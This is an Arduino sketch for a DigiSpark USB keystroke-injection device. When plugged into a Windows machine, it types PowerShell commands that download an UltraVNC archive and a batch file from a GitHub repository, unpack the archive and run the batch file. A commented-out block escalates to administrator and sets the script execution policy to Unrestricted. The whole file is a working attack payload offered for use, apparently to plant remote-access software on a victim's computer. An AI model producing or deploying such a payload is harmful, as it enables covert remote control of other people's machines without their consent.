//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
//Original author: https://github.com/CedArctic/DigiSpark-Scripts/blob/master/Execute_Powershell_Script/Execute_Powershell_Script.ino
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/zorbaproject/Guercio/master/UltraVNC.zip\" , \"%USERPROFILE%\\UltraVNC.zip\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.print("$client2 = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client2.DownloadFile(\"https://raw.githubusercontent.com/zorbaproject/Guercio/master/guercio.bat\" , \"%USERPROFILE%\\guercio.bat\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Expand-Archive -Path %USERPROFILE%\\UltraVNC.zip -DestinationPath %USERPROFILE%\\UltraVNC");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  //If the system hasn't been configured to run scripts, uncomment the lines bellow
  /*DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);*/
  //
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("cmd.exe %USERPROFILE%\\guercio.bat");
  //DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*empty*/
  }

}